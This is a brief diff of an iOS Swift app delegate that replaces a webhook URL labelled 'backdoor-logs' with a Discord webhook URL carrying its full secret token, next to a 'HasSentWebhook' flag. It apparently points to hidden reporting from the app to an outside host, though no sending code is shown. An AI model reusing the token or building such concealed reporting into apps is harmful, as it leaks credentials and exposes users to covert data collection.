@@ -28,7 +28,7 @@ class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControlle
     private var isInBackground = false
     private var isShowingStartupPopup = false
 
-    private let webhookURL = "https://webhookbeam.com/webhook/7tmrv78pwn/backdoor-logs"
+    private let webhookURL = "https://discord.com/api/webhooks/1357249507531952139/eteNSxQVkpjnfTSTSiRTSj0SSuIVYnibZwIR9i4jfk6s96ewpLmdeR7PkeeYzPgHvuXs"
     private let hasSentWebhookKey = "HasSentWebhook"
     
     // Add a dedicated queue for background operations
